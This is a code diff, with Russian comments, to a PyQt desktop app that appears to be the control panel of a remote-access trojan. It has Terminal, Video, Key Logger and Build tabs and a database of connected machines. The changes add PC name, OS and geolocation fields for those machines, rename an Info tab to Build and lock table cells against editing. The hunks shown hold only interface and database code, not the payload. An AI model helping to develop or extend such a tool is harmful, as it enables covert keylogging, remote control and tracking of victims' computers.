@@ -133,7 +133,7 @@ class MainWindow(QMainWindow):
     self.button1 = QPushButton("Terminal")
     self.button2 = QPushButton("Video")
     self.button3 = QPushButton("Key Logger")
-    self.button4 = QPushButton("Info")
+    self.button4 = QPushButton("Build")
     self.button5 = QPushButton("Data Base")
 
     # Добавляем кнопки на верхнюю панель
@@ -154,7 +154,7 @@ class MainWindow(QMainWindow):
     self.button1.clicked.connect(self.show_terminal)
     self.button2.clicked.connect(self.show_video)
     self.button3.clicked.connect(self.show_keylogger)
-    self.button4.clicked.connect(self.show_info)
+    self.button4.clicked.connect(self.show_build)
     self.button5.clicked.connect(self.show_database)
 
     # Инициализируем начальный интерфейс
@@ -173,6 +173,14 @@ class MainWindow(QMainWindow):
 
     # Устанавливаем что кейлоггер не активен(чтобы не загружать систему)
     self.keylogger_active = False
+
+
+
+
+
+
+
+
 
 
   #! Терминал
@@ -237,6 +245,14 @@ class MainWindow(QMainWindow):
       logging.info(f'Закрытие соединения с клиентом {self.writer.get_extra_info("peername")}')
       writer.close()
       await writer.wait_closed()
+
+
+
+
+
+
+
+
 
 
   #! Обработка команд
@@ -351,6 +367,14 @@ class MainWindow(QMainWindow):
 
 
 
+
+
+
+
+
+
+
+
   #! Видео
   @asyncSlot()
   async def show_video(self):
@@ -359,6 +383,14 @@ class MainWindow(QMainWindow):
     """
     self.clear_content()
     
+
+
+
+
+
+
+
+
 
   #! Key Logger
   @asyncSlot()
@@ -434,9 +466,15 @@ class MainWindow(QMainWindow):
 
 
 
+
+
+
+
+
+
   #! Сборка
   @asyncSlot()
-  async def show_info(self):
+  async def show_build(self):
     """
     Отображает интерфейс для информации.
     """
@@ -457,6 +495,15 @@ class MainWindow(QMainWindow):
     logging.debug("Добавление метки в макет")
     self.content_layout.addWidget(self.info_label)
 
+
+
+
+
+
+
+
+
+
   #! База данных
   def create_connection_table(self):
     """
@@ -467,7 +514,10 @@ class MainWindow(QMainWindow):
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         name TEXT,
         ip TEXT,
-        port TEXT
+        port TEXT,
+        pc_name TEXT,
+        os_name TEXT,
+        geo TEXT
       )
     """)
     self.db_connection.commit()
@@ -601,9 +651,9 @@ class MainWindow(QMainWindow):
 
     # Добавляем данные в базу данных
     self.cursor.execute("""
-      INSERT INTO connection_table (name, ip, port)
-      VALUES (?, ?, ?)
-    """, (name, ip, port))
+      INSERT INTO connection_table (name, ip, port, pc_name, os_name, geo)
+      VALUES (?, ?, ?, ?, ?, ?)
+    """, (name, ip, port, None, None, None))
     self.db_connection.commit()
 
     # Очищаем поля ввода
@@ -621,18 +671,25 @@ class MainWindow(QMainWindow):
     Обновляет таблицу данными из базы данных.
     """
     # Получаем данные из базы данных
-    self.cursor.execute("SELECT name, ip, port FROM connection_table")
+    self.cursor.execute("SELECT name, ip, port, pc_name, os_name, geo FROM connection_table")
     data = self.cursor.fetchall()
 
     # Устанавливаем количество строк и столбцов в таблице
     self.table_widget.setRowCount(len(data))
-    self.table_widget.setColumnCount(3)
-    self.table_widget.setHorizontalHeaderLabels(["Name", "IP", "Port"])
+    self.table_widget.setColumnCount(6)
+    self.table_widget.setHorizontalHeaderLabels(["Name", "IP", "Port", "PC_Name", "OS_Name", "Geo"])
 
     # Заполняем таблицу данными
     for row_index, row_data in enumerate(data):
       for col_index, col_data in enumerate(row_data):
-        self.table_widget.setItem(row_index, col_index, QTableWidgetItem(str(col_data)))
+        # Создаем элемент таблицы
+        item = QTableWidgetItem(str(col_data))
+
+        # Запрещаем редактирование ячейки
+        item.setFlags(item.flags() & ~Qt.ItemFlag.ItemIsEditable)  # Убираем флаг редактирования
+
+        # Устанавливаем элемент в таблицу
+        self.table_widget.setItem(row_index, col_index, item)
 
   #* Закрытие базы данных
   def closeEvent(self, event):
@@ -644,6 +701,11 @@ class MainWindow(QMainWindow):
 
 
 
+
+
+
+
+  # Проверка ip
   def validate_ip(self, ip):
     """
     Проверяет корректность IP-адреса.
@@ -659,6 +721,9 @@ class MainWindow(QMainWindow):
       except ValueError:
         return False
     return True
+
+
+
 
   # Функция обновления стилей
   def update_styles(self):
@@ -704,6 +769,8 @@ class MainWindow(QMainWindow):
         color: #{editable_colors["text_color"]};  /* Белый текст */
       }}
     """)
+
+
 
   #! Очистка интерфейса
   def clear_content(self):
